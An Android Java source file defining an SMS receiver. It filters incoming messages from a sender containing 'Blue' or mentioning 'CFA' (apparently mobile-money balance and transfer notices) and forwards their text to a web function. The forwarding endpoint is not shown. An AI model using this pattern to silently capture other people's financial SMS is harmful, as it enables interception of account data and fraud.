package com.profitloop.blueauto;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String body = sms.getDisplayMessageBody();

                    // Si le SMS vient de Blue ou contient des infos de solde/transfert
                    if (sender.toLowerCase().contains("blue") || body.contains("CFA")) {
                        MainActivity.sendSmsToWeb(body);
                    }
                }
            }
        }
    }
}
